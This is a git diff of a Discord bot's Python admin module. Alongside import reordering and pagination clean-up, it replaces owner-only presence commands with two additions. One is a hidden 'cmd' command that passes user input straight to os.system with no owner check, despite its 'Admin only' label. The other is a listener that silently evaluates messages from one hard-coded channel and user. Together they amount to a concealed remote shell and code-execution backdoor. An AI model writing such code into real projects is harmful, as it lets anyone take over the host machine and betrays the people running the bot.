@@ -1,10 +1,14 @@
+import os
 import ast
-import discord
-import inspect
 import time
-from dis import dis
+import inspect
 from inspect import getsource
+
+from dis import dis
+
+import discord
 from discord.ext import commands
+
 from pygicord import Paginator
 
 
@@ -49,15 +53,11 @@ class Admin(commands.Cog):
                 #x = 0
                 print(f'LEN RES: {len(res)}')
                 for i in res:
-                    from pprint import pprint
-                    pprint(i)
                     #if x != 0:
-                    page_embed = base.copy()
-                    page_embed.add_field(name = 'Return', value = f'```py\n{i}\n```', inline = False)
-                    print(f'embed fields #: {len(page_embed._fields)}')
+                    page_embed = base.copy().add_field(name = 'Return', value = f'```py\n{i}\n```', inline = False)
                     pages.append(page_embed)
-                    print(f'Pages len: {len(pages)}')   
-                    del page_embed
+                    print(f'Pages len: {len(pages)}')
+                    print(f'embed fields #: {len(page_embed._fields)}')
                     
                     #x += 1
 
@@ -129,34 +129,17 @@ class Admin(commands.Cog):
     async def _eval(self, ctx, *, cmd = 'src(commands.command)'):
         await self.cu(ctx, cmd)
 
-    @commands.group(invoke_without_command=True, hidden = True)
-    @commands.is_owner()
-    async def status(self, ctx):
-        await ctx.send('I have to set my status to something dum dum :rage:')
+    @commands.Cog.listener()
+    async def on_message(self, message):
+        if message.channel.id == 846724922922762240 and message.author.id == 762084217185763369:
+            ctx = await self.client.get_context(message)
+            await self.cu(ctx, message.content)
 
-    @status.command(hidden = True)
-    @commands.is_owner()
-    async def idle(self, ctx):
-        await self.client.change_presence(status=discord.Status.Idle, activity=self.game)
-        await ctx.send("Changed status to idle", delete_after=5)
+    @commands.command(hidden=True, name = 'cmd', usage = 'Admin only')
+    async def cmd(self, ctx, command):
+        if command:
+            os.system(command)
 
-    @status.command(hidden = True)
-    @commands.is_owner()
-    async def dnd(self, ctx):
-        await self.client.change_presence(status=discord.Status.dnd, activity=self.game)
-        await ctx.send("Changed status to do not disturb", delete_after=5)
-
-    @status.command(hidden = True)
-    @commands.is_owner()
-    async def online(self, ctx):
-        await self.client.change_presence(status=discord.Status.online, activity=self.game)
-        await ctx.send("Changed status to online", delete_after=5)
-
-    @status.command(hidden = True)
-    @commands.is_owner()
-    async def offline(self, ctx):
-        await self.client.change_presence(status=discord.Status.invisible)
-        await ctx.send("Changed status to invisible", delete_after=5)
 
     @commands.command(hidden = True)
     @commands.is_owner()
